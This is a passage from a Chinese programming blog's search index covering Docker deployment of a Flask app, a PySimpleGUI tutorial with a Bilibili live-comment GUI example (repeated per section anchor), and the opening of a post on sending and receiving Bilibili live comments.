使用get方法传参会出未知问题，故全部改为使用url传参 浮点误差会让数据很奇怪，注意保留两位小数 不同的数据类型（pandas与string）可能会让数据显示异常（空数据显示为’None’） Docker应用部署细节Flask本身不带服务器，使用gunicorn来使得web应用能够在服务器上被访问。 使用阿里云作为Docker Hub。 #注册完阿里云的镜像服务之后 #登录 docker login --username={{your username}} registry.cn-hangzhou.aliyuncs.com/ #命名并上传本地docker镜像 docker tag tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} docker push tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} #拉取镜像 docker pull tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} 将本地数据库挂载到Docker容器中，并运行容器。 docker run -d -p 8080:8080 -v /database:/soft/TallyApp/database {{images_id}} ","date":"2022-02-01","objectID":"/tallyapp1/:0:0","series":null,"tags":null,"title":"Flask学习1 TallyApp beta 0.9","uri":"/tallyapp1/#docker应用部署细节"},{"categories":["python"],"content":" 前言python构建本地GUI程序有很多方式，比如Tkinter，wxPython，或是PyQT。但是对于学生而言，并不需要多么华丽的用户界面，只需要“能用”就行了，开发环节越省力越好。 于是我找到了PySimpleGUI这个库。 A introduction to PySimpleGUI 这个库提供了一种近乎傻瓜化的方式，采用List来描述一个GUI界面，同时支持一个简单程序需要的全部特性，并且支持Win/Mac/Linux三大平台，十分适合拿来封装代码。 安装 pip install PySimpleGUI 在文件开头加上库引用： import PySimpleGUI as sg 元素PySimpleGUI有着丰富的控件支持。 文本框（Text） sg.Text('文本框',size=(12,1),key='output') '文本框'为框体显示的文字，size为框体的大小，key为框体标识，用于之后对文本框的定位。 输入框（Input） sg.Input(key='input') 按钮（Button） sg.Button('Go') 'Go'为按钮的名字。也可以另外设置key值。 下拉框（Comobo） [ sg.Text(\"City\", size = (20, 1)), sg.Combo((\"北京\", \"上海\", \"深圳\"), size=(10, 1), default_value=\"上海\", key = \"-CITY-\")] 弹窗（Popup） sg.Popup('弹窗1','This is the first one') sg.Popup('弹窗2','This is the second one') sg.Popup('弹窗3','This is the third one') 弹出一个窗口包含标题和内容。 选择文件（FileBrowse） sg.FileBrowse() 选择文件路径（FolderBrowse） sg.InputText(size=(15,1)),sg.FolderBrowse() 多行列表文本（ListBox） list = [1，2，3] layout = [ [sg.Listbox(values=list,size=(20,12),key='LIST',enable_events=True)] ] 多选框（Checkbox） sg.Checkbox('多选框',default=True) 单选框（Radio） # RADIO1 必有 sg.Radio('单选框','RADIO1',default=True) 大文本框（Multiline） sg.Multiline(default_text='hello') 下拉列表框（InputCombo） sg.InputCombo(['box_1','box_2'],size=(20,3)) 拖动按钮（Slider） sg.Slider(range=(1,100),orientation='h',size=(34,20),default_value=85) # (range=(1, 100)：数值范围 # orientation=拖动方向 ‘h’ :横向 ‘v’：竖向 # size=(34, 20)：大小 # default_value=85默认值 下拉选项（InputOptionMenu） sg.InputOptionMenu('Menu_1','Menu_2',size=(20,2)) 菜单（Menu） sg.Menu(menu_def, tearoff=True) 控件（Column） sg.Column(column1, background_color='') 进度条（ProgressBar） sg.ProgressBar(10,orientation='h',size=()) # 10：进度条长度 # orientation=‘h’/v 方向 调试窗口 sg.Print('内容', text_color='', background_color='', font='') 自带按钮 sg.OK(), sg.Cancel(),sg.Submit()等 #这三个按钮是自带的，默认的，不需要单独定义其作用 当然，也可以单独设置 sg.Button('Ok'), sg.Button('Cancel') 自带按钮 sg.FolderBrowse()=sg.FileBrowse(), sg.Submit(), sg.Cancel() 构建窗口使用PySimpleGUI构建一个窗口十分简单，你需要使用一个list描述元素之间的位置关系，然后系统便会自动生成布局。 以我上一篇博文Bilibili直播弹幕收发小程序 | zeroy’s blog中的GUI界面为例： sg.theme('DarkAmber')#选择主题 layout = [ [sg.Listbox('',size=(75,20),key='-OUT-')], [sg.Text('发送弹幕: ', size=(8, 1)),sg.InputText('',key='-input-'),sg.Button(\"Go\"),sg.Button(\"Exit\"),sg.Button(\"Help\")], [sg.Text('',key='-error-')] ]#使用list描述元素之间的相对关系 window=sg.Window(\"Bilibili弹幕收发程序\",layout)生成窗口 怎么样，是不是很方便呢？ 窗口中内建了多种方法，用于描述窗口事件。 window.close()#关闭窗口 window.read()#读取窗口内容 window['key名'].update('需要更新的内容') 掌握了这些基本的知识，构建一个简单的GUI程序应该没什么难的了。 上面提到的收发弹幕的程序的GUI部分完整代码如下： import PySimpleGUI as sg import send import receive sg.theme('DarkAmber') layout = [ [sg.Listbox('',size=(75,20),key='-OUT-')], [sg.Text('发送弹幕: ', size=(8, 1)),sg.InputText('',key='-input-'),sg.Button(\"Go\"),sg.Button(\"Exit\"),sg.Button(\"Help\")], [sg.Text('',key='-error-')] ] window=sg.Window(\"Bilibili弹幕收发程序\",layout) while True:#开启窗口事件 event,values=window.read(timeout=3)#为输入框设定超时 try: window['-OUT-'].update(receive.Receive())#更新输出框 except: sg.popup('error: ','请先配置好同一目录下的config.json文件')#异常信息处理 break if event in (None,'Exit'):#按到了退出 break if event=='Go':#发送弹幕 window['-error-'].update(send.Send(values['-input-'])) window['-input-'].update(\"\") if event=='Help':#帮助页面 sg.popup('帮助: ','请先配置好同一目录下的config.json文件') window.close() 更多的例子以及更高阶的应用指路：官方代码库 总结这个东西过于简洁，适合完全不会写GUI的程序员应急。 ","date":"2022-01-26","objectID":"/articles/PySimpleGUI/:0:0","series":null,"tags":null,"title":"使用PySimpleGUI库构建简单的图形界面","uri":"/articles/PySimpleGUI/#"},{"categories":["python"],"content":" 前言python构建本地GUI程序有很多方式，比如Tkinter，wxPython，或是PyQT。但是对于学生而言，并不需要多么华丽的用户界面，只需要“能用”就行了，开发环节越省力越好。 于是我找到了PySimpleGUI这个库。 A introduction to PySimpleGUI 这个库提供了一种近乎傻瓜化的方式，采用List来描述一个GUI界面，同时支持一个简单程序需要的全部特性，并且支持Win/Mac/Linux三大平台，十分适合拿来封装代码。 安装 pip install PySimpleGUI 在文件开头加上库引用： import PySimpleGUI as sg 元素PySimpleGUI有着丰富的控件支持。 文本框（Text） sg.Text('文本框',size=(12,1),key='output') '文本框'为框体显示的文字，size为框体的大小，key为框体标识，用于之后对文本框的定位。 输入框（Input） sg.Input(key='input') 按钮（Button） sg.Button('Go') 'Go'为按钮的名字。也可以另外设置key值。 下拉框（Comobo） [ sg.Text(\"City\", size = (20, 1)), sg.Combo((\"北京\", \"上海\", \"深圳\"), size=(10, 1), default_value=\"上海\", key = \"-CITY-\")] 弹窗（Popup） sg.Popup('弹窗1','This is the first one') sg.Popup('弹窗2','This is the second one') sg.Popup('弹窗3','This is the third one') 弹出一个窗口包含标题和内容。 选择文件（FileBrowse） sg.FileBrowse() 选择文件路径（FolderBrowse） sg.InputText(size=(15,1)),sg.FolderBrowse() 多行列表文本（ListBox） list = [1，2，3] layout = [ [sg.Listbox(values=list,size=(20,12),key='LIST',enable_events=True)] ] 多选框（Checkbox） sg.Checkbox('多选框',default=True) 单选框（Radio） # RADIO1 必有 sg.Radio('单选框','RADIO1',default=True) 大文本框（Multiline） sg.Multiline(default_text='hello') 下拉列表框（InputCombo） sg.InputCombo(['box_1','box_2'],size=(20,3)) 拖动按钮（Slider） sg.Slider(range=(1,100),orientation='h',size=(34,20),default_value=85) # (range=(1, 100)：数值范围 # orientation=拖动方向 ‘h’ :横向 ‘v’：竖向 # size=(34, 20)：大小 # default_value=85默认值 下拉选项（InputOptionMenu） sg.InputOptionMenu('Menu_1','Menu_2',size=(20,2)) 菜单（Menu） sg.Menu(menu_def, tearoff=True) 控件（Column） sg.Column(column1, background_color='') 进度条（ProgressBar） sg.ProgressBar(10,orientation='h',size=()) # 10：进度条长度 # orientation=‘h’/v 方向 调试窗口 sg.Print('内容', text_color='', background_color='', font='') 自带按钮 sg.OK(), sg.Cancel(),sg.Submit()等 #这三个按钮是自带的，默认的，不需要单独定义其作用 当然，也可以单独设置 sg.Button('Ok'), sg.Button('Cancel') 自带按钮 sg.FolderBrowse()=sg.FileBrowse(), sg.Submit(), sg.Cancel() 构建窗口使用PySimpleGUI构建一个窗口十分简单，你需要使用一个list描述元素之间的位置关系，然后系统便会自动生成布局。 以我上一篇博文Bilibili直播弹幕收发小程序 | zeroy’s blog中的GUI界面为例： sg.theme('DarkAmber')#选择主题 layout = [ [sg.Listbox('',size=(75,20),key='-OUT-')], [sg.Text('发送弹幕: ', size=(8, 1)),sg.InputText('',key='-input-'),sg.Button(\"Go\"),sg.Button(\"Exit\"),sg.Button(\"Help\")], [sg.Text('',key='-error-')] ]#使用list描述元素之间的相对关系 window=sg.Window(\"Bilibili弹幕收发程序\",layout)生成窗口 怎么样，是不是很方便呢？ 窗口中内建了多种方法，用于描述窗口事件。 window.close()#关闭窗口 window.read()#读取窗口内容 window['key名'].update('需要更新的内容') 掌握了这些基本的知识，构建一个简单的GUI程序应该没什么难的了。 上面提到的收发弹幕的程序的GUI部分完整代码如下： import PySimpleGUI as sg import send import receive sg.theme('DarkAmber') layout = [ [sg.Listbox('',size=(75,20),key='-OUT-')], [sg.Text('发送弹幕: ', size=(8, 1)),sg.InputText('',key='-input-'),sg.Button(\"Go\"),sg.Button(\"Exit\"),sg.Button(\"Help\")], [sg.Text('',key='-error-')] ] window=sg.Window(\"Bilibili弹幕收发程序\",layout) while True:#开启窗口事件 event,values=window.read(timeout=3)#为输入框设定超时 try: window['-OUT-'].update(receive.Receive())#更新输出框 except: sg.popup('error: ','请先配置好同一目录下的config.json文件')#异常信息处理 break if event in (None,'Exit'):#按到了退出 break if event=='Go':#发送弹幕 window['-error-'].update(send.Send(values['-input-'])) window['-input-'].update(\"\") if event=='Help':#帮助页面 sg.popup('帮助: ','请先配置好同一目录下的config.json文件') window.close() 更多的例子以及更高阶的应用指路：官方代码库 总结这个东西过于简洁，适合完全不会写GUI的程序员应急。 ","date":"2022-01-26","objectID":"/articles/PySimpleGUI/:0:0","series":null,"tags":null,"title":"使用PySimpleGUI库构建简单的图形界面","uri":"/articles/PySimpleGUI/#前言"},{"categories":["python"],"content":" 前言python构建本地GUI程序有很多方式，比如Tkinter，wxPython，或是PyQT。但是对于学生而言，并不需要多么华丽的用户界面，只需要“能用”就行了，开发环节越省力越好。 于是我找到了PySimpleGUI这个库。 A introduction to PySimpleGUI 这个库提供了一种近乎傻瓜化的方式，采用List来描述一个GUI界面，同时支持一个简单程序需要的全部特性，并且支持Win/Mac/Linux三大平台，十分适合拿来封装代码。 安装 pip install PySimpleGUI 在文件开头加上库引用： import PySimpleGUI as sg 元素PySimpleGUI有着丰富的控件支持。 文本框（Text） sg.Text('文本框',size=(12,1),key='output') '文本框'为框体显示的文字，size为框体的大小，key为框体标识，用于之后对文本框的定位。 输入框（Input） sg.Input(key='input') 按钮（Button） sg.Button('Go') 'Go'为按钮的名字。也可以另外设置key值。 下拉框（Comobo） [ sg.Text(\"City\", size = (20, 1)), sg.Combo((\"北京\", \"上海\", \"深圳\"), size=(10, 1), default_value=\"上海\", key = \"-CITY-\")] 弹窗（Popup） sg.Popup('弹窗1','This is the first one') sg.Popup('弹窗2','This is the second one') sg.Popup('弹窗3','This is the third one') 弹出一个窗口包含标题和内容。 选择文件（FileBrowse） sg.FileBrowse() 选择文件路径（FolderBrowse） sg.InputText(size=(15,1)),sg.FolderBrowse() 多行列表文本（ListBox） list = [1，2，3] layout = [ [sg.Listbox(values=list,size=(20,12),key='LIST',enable_events=True)] ] 多选框（Checkbox） sg.Checkbox('多选框',default=True) 单选框（Radio） # RADIO1 必有 sg.Radio('单选框','RADIO1',default=True) 大文本框（Multiline） sg.Multiline(default_text='hello') 下拉列表框（InputCombo） sg.InputCombo(['box_1','box_2'],size=(20,3)) 拖动按钮（Slider） sg.Slider(range=(1,100),orientation='h',size=(34,20),default_value=85) # (range=(1, 100)：数值范围 # orientation=拖动方向 ‘h’ :横向 ‘v’：竖向 # size=(34, 20)：大小 # default_value=85默认值 下拉选项（InputOptionMenu） sg.InputOptionMenu('Menu_1','Menu_2',size=(20,2)) 菜单（Menu） sg.Menu(menu_def, tearoff=True) 控件（Column） sg.Column(column1, background_color='') 进度条（ProgressBar） sg.ProgressBar(10,orientation='h',size=()) # 10：进度条长度 # orientation=‘h’/v 方向 调试窗口 sg.Print('内容', text_color='', background_color='', font='') 自带按钮 sg.OK(), sg.Cancel(),sg.Submit()等 #这三个按钮是自带的，默认的，不需要单独定义其作用 当然，也可以单独设置 sg.Button('Ok'), sg.Button('Cancel') 自带按钮 sg.FolderBrowse()=sg.FileBrowse(), sg.Submit(), sg.Cancel() 构建窗口使用PySimpleGUI构建一个窗口十分简单，你需要使用一个list描述元素之间的位置关系，然后系统便会自动生成布局。 以我上一篇博文Bilibili直播弹幕收发小程序 | zeroy’s blog中的GUI界面为例： sg.theme('DarkAmber')#选择主题 layout = [ [sg.Listbox('',size=(75,20),key='-OUT-')], [sg.Text('发送弹幕: ', size=(8, 1)),sg.InputText('',key='-input-'),sg.Button(\"Go\"),sg.Button(\"Exit\"),sg.Button(\"Help\")], [sg.Text('',key='-error-')] ]#使用list描述元素之间的相对关系 window=sg.Window(\"Bilibili弹幕收发程序\",layout)生成窗口 怎么样，是不是很方便呢？ 窗口中内建了多种方法，用于描述窗口事件。 window.close()#关闭窗口 window.read()#读取窗口内容 window['key名'].update('需要更新的内容') 掌握了这些基本的知识，构建一个简单的GUI程序应该没什么难的了。 上面提到的收发弹幕的程序的GUI部分完整代码如下： import PySimpleGUI as sg import send import receive sg.theme('DarkAmber') layout = [ [sg.Listbox('',size=(75,20),key='-OUT-')], [sg.Text('发送弹幕: ', size=(8, 1)),sg.InputText('',key='-input-'),sg.Button(\"Go\"),sg.Button(\"Exit\"),sg.Button(\"Help\")], [sg.Text('',key='-error-')] ] window=sg.Window(\"Bilibili弹幕收发程序\",layout) while True:#开启窗口事件 event,values=window.read(timeout=3)#为输入框设定超时 try: window['-OUT-'].update(receive.Receive())#更新输出框 except: sg.popup('error: ','请先配置好同一目录下的config.json文件')#异常信息处理 break if event in (None,'Exit'):#按到了退出 break if event=='Go':#发送弹幕 window['-error-'].update(send.Send(values['-input-'])) window['-input-'].update(\"\") if event=='Help':#帮助页面 sg.popup('帮助: ','请先配置好同一目录下的config.json文件') window.close() 更多的例子以及更高阶的应用指路：官方代码库 总结这个东西过于简洁，适合完全不会写GUI的程序员应急。 ","date":"2022-01-26","objectID":"/articles/PySimpleGUI/:0:0","series":null,"tags":null,"title":"使用PySimpleGUI库构建简单的图形界面","uri":"/articles/PySimpleGUI/#安装"},{"categories":["python"],"content":" 前言python构建本地GUI程序有很多方式，比如Tkinter，wxPython，或是PyQT。但是对于学生而言，并不需要多么华丽的用户界面，只需要“能用”就行了，开发环节越省力越好。 于是我找到了PySimpleGUI这个库。 A introduction to PySimpleGUI 这个库提供了一种近乎傻瓜化的方式，采用List来描述一个GUI界面，同时支持一个简单程序需要的全部特性，并且支持Win/Mac/Linux三大平台，十分适合拿来封装代码。 安装 pip install PySimpleGUI 在文件开头加上库引用： import PySimpleGUI as sg 元素PySimpleGUI有着丰富的控件支持。 文本框（Text） sg.Text('文本框',size=(12,1),key='output') '文本框'为框体显示的文字，size为框体的大小，key为框体标识，用于之后对文本框的定位。 输入框（Input） sg.Input(key='input') 按钮（Button） sg.Button('Go') 'Go'为按钮的名字。也可以另外设置key值。 下拉框（Comobo） [ sg.Text(\"City\", size = (20, 1)), sg.Combo((\"北京\", \"上海\", \"深圳\"), size=(10, 1), default_value=\"上海\", key = \"-CITY-\")] 弹窗（Popup） sg.Popup('弹窗1','This is the first one') sg.Popup('弹窗2','This is the second one') sg.Popup('弹窗3','This is the third one') 弹出一个窗口包含标题和内容。 选择文件（FileBrowse） sg.FileBrowse() 选择文件路径（FolderBrowse） sg.InputText(size=(15,1)),sg.FolderBrowse() 多行列表文本（ListBox） list = [1，2，3] layout = [ [sg.Listbox(values=list,size=(20,12),key='LIST',enable_events=True)] ] 多选框（Checkbox） sg.Checkbox('多选框',default=True) 单选框（Radio） # RADIO1 必有 sg.Radio('单选框','RADIO1',default=True) 大文本框（Multiline） sg.Multiline(default_text='hello') 下拉列表框（InputCombo） sg.InputCombo(['box_1','box_2'],size=(20,3)) 拖动按钮（Slider） sg.Slider(range=(1,100),orientation='h',size=(34,20),default_value=85) # (range=(1, 100)：数值范围 # orientation=拖动方向 ‘h’ :横向 ‘v’：竖向 # size=(34, 20)：大小 # default_value=85默认值 下拉选项（InputOptionMenu） sg.InputOptionMenu('Menu_1','Menu_2',size=(20,2)) 菜单（Menu） sg.Menu(menu_def, tearoff=True) 控件（Column） sg.Column(column1, background_color='') 进度条（ProgressBar） sg.ProgressBar(10,orientation='h',size=()) # 10：进度条长度 # orientation=‘h’/v 方向 调试窗口 sg.Print('内容', text_color='', background_color='', font='') 自带按钮 sg.OK(), sg.Cancel(),sg.Submit()等 #这三个按钮是自带的，默认的，不需要单独定义其作用 当然，也可以单独设置 sg.Button('Ok'), sg.Button('Cancel') 自带按钮 sg.FolderBrowse()=sg.FileBrowse(), sg.Submit(), sg.Cancel() 构建窗口使用PySimpleGUI构建一个窗口十分简单，你需要使用一个list描述元素之间的位置关系，然后系统便会自动生成布局。 以我上一篇博文Bilibili直播弹幕收发小程序 | zeroy’s blog中的GUI界面为例： sg.theme('DarkAmber')#选择主题 layout = [ [sg.Listbox('',size=(75,20),key='-OUT-')], [sg.Text('发送弹幕: ', size=(8, 1)),sg.InputText('',key='-input-'),sg.Button(\"Go\"),sg.Button(\"Exit\"),sg.Button(\"Help\")], [sg.Text('',key='-error-')] ]#使用list描述元素之间的相对关系 window=sg.Window(\"Bilibili弹幕收发程序\",layout)生成窗口 怎么样，是不是很方便呢？ 窗口中内建了多种方法，用于描述窗口事件。 window.close()#关闭窗口 window.read()#读取窗口内容 window['key名'].update('需要更新的内容') 掌握了这些基本的知识，构建一个简单的GUI程序应该没什么难的了。 上面提到的收发弹幕的程序的GUI部分完整代码如下： import PySimpleGUI as sg import send import receive sg.theme('DarkAmber') layout = [ [sg.Listbox('',size=(75,20),key='-OUT-')], [sg.Text('发送弹幕: ', size=(8, 1)),sg.InputText('',key='-input-'),sg.Button(\"Go\"),sg.Button(\"Exit\"),sg.Button(\"Help\")], [sg.Text('',key='-error-')] ] window=sg.Window(\"Bilibili弹幕收发程序\",layout) while True:#开启窗口事件 event,values=window.read(timeout=3)#为输入框设定超时 try: window['-OUT-'].update(receive.Receive())#更新输出框 except: sg.popup('error: ','请先配置好同一目录下的config.json文件')#异常信息处理 break if event in (None,'Exit'):#按到了退出 break if event=='Go':#发送弹幕 window['-error-'].update(send.Send(values['-input-'])) window['-input-'].update(\"\") if event=='Help':#帮助页面 sg.popup('帮助: ','请先配置好同一目录下的config.json文件') window.close() 更多的例子以及更高阶的应用指路：官方代码库 总结这个东西过于简洁，适合完全不会写GUI的程序员应急。 ","date":"2022-01-26","objectID":"/articles/PySimpleGUI/:0:0","series":null,"tags":null,"title":"使用PySimpleGUI库构建简单的图形界面","uri":"/articles/PySimpleGUI/#元素"},{"categories":["python"],"content":" 前言python构建本地GUI程序有很多方式，比如Tkinter，wxPython，或是PyQT。但是对于学生而言，并不需要多么华丽的用户界面，只需要“能用”就行了，开发环节越省力越好。 于是我找到了PySimpleGUI这个库。 A introduction to PySimpleGUI 这个库提供了一种近乎傻瓜化的方式，采用List来描述一个GUI界面，同时支持一个简单程序需要的全部特性，并且支持Win/Mac/Linux三大平台，十分适合拿来封装代码。 安装 pip install PySimpleGUI 在文件开头加上库引用： import PySimpleGUI as sg 元素PySimpleGUI有着丰富的控件支持。 文本框（Text） sg.Text('文本框',size=(12,1),key='output') '文本框'为框体显示的文字，size为框体的大小，key为框体标识，用于之后对文本框的定位。 输入框（Input） sg.Input(key='input') 按钮（Button） sg.Button('Go') 'Go'为按钮的名字。也可以另外设置key值。 下拉框（Comobo） [ sg.Text(\"City\", size = (20, 1)), sg.Combo((\"北京\", \"上海\", \"深圳\"), size=(10, 1), default_value=\"上海\", key = \"-CITY-\")] 弹窗（Popup） sg.Popup('弹窗1','This is the first one') sg.Popup('弹窗2','This is the second one') sg.Popup('弹窗3','This is the third one') 弹出一个窗口包含标题和内容。 选择文件（FileBrowse） sg.FileBrowse() 选择文件路径（FolderBrowse） sg.InputText(size=(15,1)),sg.FolderBrowse() 多行列表文本（ListBox） list = [1，2，3] layout = [ [sg.Listbox(values=list,size=(20,12),key='LIST',enable_events=True)] ] 多选框（Checkbox） sg.Checkbox('多选框',default=True) 单选框（Radio） # RADIO1 必有 sg.Radio('单选框','RADIO1',default=True) 大文本框（Multiline） sg.Multiline(default_text='hello') 下拉列表框（InputCombo） sg.InputCombo(['box_1','box_2'],size=(20,3)) 拖动按钮（Slider） sg.Slider(range=(1,100),orientation='h',size=(34,20),default_value=85) # (range=(1, 100)：数值范围 # orientation=拖动方向 ‘h’ :横向 ‘v’：竖向 # size=(34, 20)：大小 # default_value=85默认值 下拉选项（InputOptionMenu） sg.InputOptionMenu('Menu_1','Menu_2',size=(20,2)) 菜单（Menu） sg.Menu(menu_def, tearoff=True) 控件（Column） sg.Column(column1, background_color='') 进度条（ProgressBar） sg.ProgressBar(10,orientation='h',size=()) # 10：进度条长度 # orientation=‘h’/v 方向 调试窗口 sg.Print('内容', text_color='', background_color='', font='') 自带按钮 sg.OK(), sg.Cancel(),sg.Submit()等 #这三个按钮是自带的，默认的，不需要单独定义其作用 当然，也可以单独设置 sg.Button('Ok'), sg.Button('Cancel') 自带按钮 sg.FolderBrowse()=sg.FileBrowse(), sg.Submit(), sg.Cancel() 构建窗口使用PySimpleGUI构建一个窗口十分简单，你需要使用一个list描述元素之间的位置关系，然后系统便会自动生成布局。 以我上一篇博文Bilibili直播弹幕收发小程序 | zeroy’s blog中的GUI界面为例： sg.theme('DarkAmber')#选择主题 layout = [ [sg.Listbox('',size=(75,20),key='-OUT-')], [sg.Text('发送弹幕: ', size=(8, 1)),sg.InputText('',key='-input-'),sg.Button(\"Go\"),sg.Button(\"Exit\"),sg.Button(\"Help\")], [sg.Text('',key='-error-')] ]#使用list描述元素之间的相对关系 window=sg.Window(\"Bilibili弹幕收发程序\",layout)生成窗口 怎么样，是不是很方便呢？ 窗口中内建了多种方法，用于描述窗口事件。 window.close()#关闭窗口 window.read()#读取窗口内容 window['key名'].update('需要更新的内容') 掌握了这些基本的知识，构建一个简单的GUI程序应该没什么难的了。 上面提到的收发弹幕的程序的GUI部分完整代码如下： import PySimpleGUI as sg import send import receive sg.theme('DarkAmber') layout = [ [sg.Listbox('',size=(75,20),key='-OUT-')], [sg.Text('发送弹幕: ', size=(8, 1)),sg.InputText('',key='-input-'),sg.Button(\"Go\"),sg.Button(\"Exit\"),sg.Button(\"Help\")], [sg.Text('',key='-error-')] ] window=sg.Window(\"Bilibili弹幕收发程序\",layout) while True:#开启窗口事件 event,values=window.read(timeout=3)#为输入框设定超时 try: window['-OUT-'].update(receive.Receive())#更新输出框 except: sg.popup('error: ','请先配置好同一目录下的config.json文件')#异常信息处理 break if event in (None,'Exit'):#按到了退出 break if event=='Go':#发送弹幕 window['-error-'].update(send.Send(values['-input-'])) window['-input-'].update(\"\") if event=='Help':#帮助页面 sg.popup('帮助: ','请先配置好同一目录下的config.json文件') window.close() 更多的例子以及更高阶的应用指路：官方代码库 总结这个东西过于简洁，适合完全不会写GUI的程序员应急。 ","date":"2022-01-26","objectID":"/articles/PySimpleGUI/:0:0","series":null,"tags":null,"title":"使用PySimpleGUI库构建简单的图形界面","uri":"/articles/PySimpleGUI/#构建窗口"},{"categories":["python"],"content":" 前言python构建本地GUI程序有很多方式，比如Tkinter，wxPython，或是PyQT。但是对于学生而言，并不需要多么华丽的用户界面，只需要“能用”就行了，开发环节越省力越好。 于是我找到了PySimpleGUI这个库。 A introduction to PySimpleGUI 这个库提供了一种近乎傻瓜化的方式，采用List来描述一个GUI界面，同时支持一个简单程序需要的全部特性，并且支持Win/Mac/Linux三大平台，十分适合拿来封装代码。 安装 pip install PySimpleGUI 在文件开头加上库引用： import PySimpleGUI as sg 元素PySimpleGUI有着丰富的控件支持。 文本框（Text） sg.Text('文本框',size=(12,1),key='output') '文本框'为框体显示的文字，size为框体的大小，key为框体标识，用于之后对文本框的定位。 输入框（Input） sg.Input(key='input') 按钮（Button） sg.Button('Go') 'Go'为按钮的名字。也可以另外设置key值。 下拉框（Comobo） [ sg.Text(\"City\", size = (20, 1)), sg.Combo((\"北京\", \"上海\", \"深圳\"), size=(10, 1), default_value=\"上海\", key = \"-CITY-\")] 弹窗（Popup） sg.Popup('弹窗1','This is the first one') sg.Popup('弹窗2','This is the second one') sg.Popup('弹窗3','This is the third one') 弹出一个窗口包含标题和内容。 选择文件（FileBrowse） sg.FileBrowse() 选择文件路径（FolderBrowse） sg.InputText(size=(15,1)),sg.FolderBrowse() 多行列表文本（ListBox） list = [1，2，3] layout = [ [sg.Listbox(values=list,size=(20,12),key='LIST',enable_events=True)] ] 多选框（Checkbox） sg.Checkbox('多选框',default=True) 单选框（Radio） # RADIO1 必有 sg.Radio('单选框','RADIO1',default=True) 大文本框（Multiline） sg.Multiline(default_text='hello') 下拉列表框（InputCombo） sg.InputCombo(['box_1','box_2'],size=(20,3)) 拖动按钮（Slider） sg.Slider(range=(1,100),orientation='h',size=(34,20),default_value=85) # (range=(1, 100)：数值范围 # orientation=拖动方向 ‘h’ :横向 ‘v’：竖向 # size=(34, 20)：大小 # default_value=85默认值 下拉选项（InputOptionMenu） sg.InputOptionMenu('Menu_1','Menu_2',size=(20,2)) 菜单（Menu） sg.Menu(menu_def, tearoff=True) 控件（Column） sg.Column(column1, background_color='') 进度条（ProgressBar） sg.ProgressBar(10,orientation='h',size=()) # 10：进度条长度 # orientation=‘h’/v 方向 调试窗口 sg.Print('内容', text_color='', background_color='', font='') 自带按钮 sg.OK(), sg.Cancel(),sg.Submit()等 #这三个按钮是自带的，默认的，不需要单独定义其作用 当然，也可以单独设置 sg.Button('Ok'), sg.Button('Cancel') 自带按钮 sg.FolderBrowse()=sg.FileBrowse(), sg.Submit(), sg.Cancel() 构建窗口使用PySimpleGUI构建一个窗口十分简单，你需要使用一个list描述元素之间的位置关系，然后系统便会自动生成布局。 以我上一篇博文Bilibili直播弹幕收发小程序 | zeroy’s blog中的GUI界面为例： sg.theme('DarkAmber')#选择主题 layout = [ [sg.Listbox('',size=(75,20),key='-OUT-')], [sg.Text('发送弹幕: ', size=(8, 1)),sg.InputText('',key='-input-'),sg.Button(\"Go\"),sg.Button(\"Exit\"),sg.Button(\"Help\")], [sg.Text('',key='-error-')] ]#使用list描述元素之间的相对关系 window=sg.Window(\"Bilibili弹幕收发程序\",layout)生成窗口 怎么样，是不是很方便呢？ 窗口中内建了多种方法，用于描述窗口事件。 window.close()#关闭窗口 window.read()#读取窗口内容 window['key名'].update('需要更新的内容') 掌握了这些基本的知识，构建一个简单的GUI程序应该没什么难的了。 上面提到的收发弹幕的程序的GUI部分完整代码如下： import PySimpleGUI as sg import send import receive sg.theme('DarkAmber') layout = [ [sg.Listbox('',size=(75,20),key='-OUT-')], [sg.Text('发送弹幕: ', size=(8, 1)),sg.InputText('',key='-input-'),sg.Button(\"Go\"),sg.Button(\"Exit\"),sg.Button(\"Help\")], [sg.Text('',key='-error-')] ] window=sg.Window(\"Bilibili弹幕收发程序\",layout) while True:#开启窗口事件 event,values=window.read(timeout=3)#为输入框设定超时 try: window['-OUT-'].update(receive.Receive())#更新输出框 except: sg.popup('error: ','请先配置好同一目录下的config.json文件')#异常信息处理 break if event in (None,'Exit'):#按到了退出 break if event=='Go':#发送弹幕 window['-error-'].update(send.Send(values['-input-'])) window['-input-'].update(\"\") if event=='Help':#帮助页面 sg.popup('帮助: ','请先配置好同一目录下的config.json文件') window.close() 更多的例子以及更高阶的应用指路：官方代码库 总结这个东西过于简洁，适合完全不会写GUI的程序员应急。 ","date":"2022-01-26","objectID":"/articles/PySimpleGUI/:0:0","series":null,"tags":null,"title":"使用PySimpleGUI库构建简单的图形界面","uri":"/articles/PySimpleGUI/#总结"},{"categories":["python"],"content":"项目地址 ","date":"2022-01-18","objectID":"/articles/Bilibili-send-and-receive/:0:0","series":null,"tags":null,"title":"Bilibili直播弹幕收发小程序","uri":"/articles/Bilibili-send-and-receive/#"},{"categories":["python"],"content":" 需求分析在Linux下直播看不到弹幕，无法与观众互动。 ","date":"2022-01-18","objectID":"/articles/Bilibili-send-and-receive/:1:0","series":null,"tags":null,"title":"Bilibili直播弹幕收发小程序","uri":"/articles/Bilibili-send-and-receive/#需求分析"},{"categories":["python"],"content":" 实现过程","date":"2022-01-18","objectID":"/articles/Bilibili-send-and-receive/:2:0","series":null,"tags":null,"title":"Bilibili直播弹幕收发小程序","uri":"/articles/Bilibili-send-and-receive/#实现过程"},{"categories":["python"],"content":" 第一阶段问题可拆分为收与发。 可行性分析B站有API能够返回一个直播间最近的10条弹幕，可以依赖这个API接收弹幕。 抓包可知一次发送弹幕的行为即为一次POST请求，可以使用python脚本实现发送信息。 分别编写发送和接收弹幕的程序。开两个终端使用。 ","date":"2022-01-18","objectID":"/articles/Bilibili-send-and-receive/:2:1","series":null,"tags":null,"title":"Bilibili直播弹幕收发小程序","uri":"/articles/Bilibili-send-and-receive/#第一阶段"},{"categories":["python"],"content":" 第一阶段问题可拆分为收与发。 可行性分析B站有API能够返回一个直播间最近的10条弹幕，可以依赖这个API接收弹幕。 抓包可知一次发送弹幕的行为即为一次POST请求，可以使用python脚本实现发送信息。 分别编写发送和接收弹幕的程序。开两个终端使用。 